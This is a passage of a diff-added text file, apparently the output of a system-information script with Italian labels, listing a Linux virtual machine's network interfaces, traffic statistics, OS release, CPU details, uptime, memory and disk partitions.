+Indirizzo IP: 127.0.0.1
+Network mask: 255.0.0.0
+Broadcast: None
+
+Nome interfaccia di rete: enp0s3
+Indirizzo IP: 10.0.2.15
+Network mask: 255.255.255.0
+Broadcast: 10.0.2.255
+
+Nome interfaccia di rete: enp0s8
+Indirizzo IP: 192.168.1.224
+Network mask: 255.255.255.0
+Broadcast: 192.168.1.255
+
+
+=== STATISTICHE SULLA RETE === 
+Totale byte inviati: 795.45MB
+Totale byte ricevuti: 6.33MB
+Totale pacchetti inviati: 579672
+Totale pacchetti ricevuti: 91661
+Totale errori in ricezione pacchetti: 0
+Totale errori in invio pacchetti: 0
+Totale pacchetti in arrivo persi: 24
+Totale pacchetti in uscita persi: 0
+
+
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+
+=== INFORMAZIONI SULLA CPU === 
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 0
+cpu cores	: 4
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 1
+cpu cores	: 4
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 2
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 2
+cpu cores	: 4
+apicid		: 2
+initial apicid	: 2
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+
+processor	: 3
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 142
+model name	: Intel(R) Core(TM) i7-8569U CPU @ 2.80GHz
+stepping	: 10
+cpu MHz		: 2819.348
+cache size	: 8192 KB
+physical id	: 0
+siblings	: 4
+core id		: 3
+cpu cores	: 4
+apicid		: 3
+initial apicid	: 3
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 22
+wp		: yes
+bugs		: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_stale_data retbleed
+bogomips	: 5638.69
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 39 bits physical, 48 bits virtual
+power management:
+=== INFORMAZIONI SUL TEMPO D'AVVIO === 
+Il sistema e' attivo dal giorno 13/12/2022 dalle ore 17:23:41
+
+=== INFORMAZIONI SULLA MEMORIA RAM === 
+Memoria totale: 3.83GB
+Memoria disponibile: 2.40GB
+Memoria in uso: 1.07GB
+Percentuale memoria in uso: 37.3%
+
+=== INFORMAZIONI SUL DISCO E SULLE PARTIZIONI === 
+
+=== PARTIZIONI INDIVIDUATE ===
+Nome partizione: /dev/sda3
+Punto di mount: /
+Tipo di file system: ext4
+
+Nom
